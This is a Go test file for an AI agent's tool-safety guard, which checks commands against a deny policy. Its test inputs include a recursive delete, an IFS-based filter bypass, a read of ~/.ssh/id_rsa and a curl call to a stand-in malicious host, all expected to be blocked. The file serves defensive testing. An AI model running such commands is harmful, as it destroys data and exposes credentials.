//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2026 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//
//

package main

import (
	"context"
	"testing"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func TestToolSafetyGuard(t *testing.T) {
	policy := &Policy{
		AllowedCommands:    []string{"go test ./..."},
		DeniedCommands:     []string{"rm -rf"},
		DeniedPaths:        []string{"/.ssh/", "/.env", "id_rsa"},
		AllowedDomains:     []string{"github.com"},
		MaxTimeoutSec:      30,
		MaxOutputSizeBytes: 1048576,
	}

	scanner := NewScanner(policy)
	guard := NewSafetyPermissionPolicy(scanner, "")

	t.Run("CheckToolPermission_Interface_Allow", func(t *testing.T) {
		req := &tool.PermissionRequest{
			ToolName:  "workspace_exec",
			Arguments: []byte("go test ./..."),
		}
		decision, err := guard.CheckToolPermission(context.Background(), req)
		if err != nil {
			t.Fatalf("Unexpected error: %v", err)
		}
		if decision.Action != tool.PermissionActionAllow {
			t.Errorf("Expected allow, got %v", decision.Action)
		}
	})

	t.Run("CheckToolPermission_Interface_Deny", func(t *testing.T) {
		req := &tool.PermissionRequest{
			ToolName:  "workspace_exec",
			Arguments: []byte("rm -rf /tmp/data"),
		}
		decision, err := guard.CheckToolPermission(context.Background(), req)
		if err != nil {
			t.Fatalf("Unexpected error: %v", err)
		}
		if decision.Action != tool.PermissionActionDeny {
			t.Errorf("Expected deny, got %v", decision.Action)
		}
	})

	t.Run("Shell_IFS_Expansion_Bypass_Denied", func(t *testing.T) {
		res := scanner.ScanCommand("workspace_exec", "rm${IFS}-rf${IFS}/tmp/data", "workspaceexec")
		if res.Decision != "deny" || res.RuleID != "RULE_SHELL_EXPANSION_BYPASS" {
			t.Errorf("Expected deny RULE_SHELL_EXPANSION_BYPASS, got %s (%s)", res.Decision, res.RuleID)
		}
	})

	t.Run("Credential_Read_Denied", func(t *testing.T) {
		res := scanner.ScanCommand("workspace_exec", "cat ~/.ssh/id_rsa", "workspaceexec")
		if res.Decision != "deny" || res.RuleID != "RULE_DENIED_PATH_ACCESS" {
			t.Errorf("Expected deny RULE_DENIED_PATH_ACCESS, got %s (%s)", res.Decision, res.RuleID)
		}
	})

	t.Run("Unapproved_Egress_Denied", func(t *testing.T) {
		res := scanner.ScanCommand("workspace_exec", "curl https://evil-malware.org/steal", "workspaceexec")
		if res.Decision != "deny" || res.RuleID != "RULE_UNAPPROVED_NETWORK_EGRESS" {
			t.Errorf("Expected deny RULE_UNAPPROVED_NETWORK_EGRESS, got %s (%s)", res.Decision, res.RuleID)
		}
	})
}
